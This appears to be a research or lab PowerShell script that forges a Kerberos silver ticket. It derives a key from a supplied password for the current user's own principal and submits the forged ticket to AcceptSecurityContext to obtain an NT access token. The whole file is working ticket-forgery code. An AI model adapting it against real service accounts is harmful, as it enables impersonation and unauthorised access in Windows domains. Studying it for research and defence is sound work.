# Silver ticket
param(
    [Parameter(Mandatory)]
    [string]$Password,
    [switch]$Format
)

. "$PSScriptRoot\common.ps1"

try {
    # Setup general variables.
    $realm = (Get-WMIObject Win32_ComputerSystem).Domain.ToUpper()
    $sid = Get-NtSid
    $username = (Get-NtSidName $sid).Name
    $name = New-KerberosPrincipalName -Name $username -Type PRINCIPAL

    # Get user's key and build a silver ticket.
    $key = Get-KerberosKey -KeyType AES256_CTS_HMAC_SHA1_96 -Password $Password -Principal "$username@$realm"
    $cred = New-KerberosSilverTicket -Key $key -ServerName $name -ClientName $name -Realm $realm -UserSid $sid -Format:$Format

    # Create a non-LSA client context, doesn't call InitializeSecurityContext.
    $client = New-LsaClientContext -Ticket $cred
    if ($Format) {
        Format-LsaAuthToken $client | Out-Host
    }

    # Submit AP-REQ with silver ticket to AcceptSecurityContext.
    Use-NtObject($cred_handle = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Inbound) {
        Use-NtObject($server = New-LsaServerContext -CredHandle $cred_handle) {
            Update-LsaServerContext $server $client

            # Get NT access token.
            Get-LsaAccessToken $server
        }
    }
} catch {
    Write-Error $_
}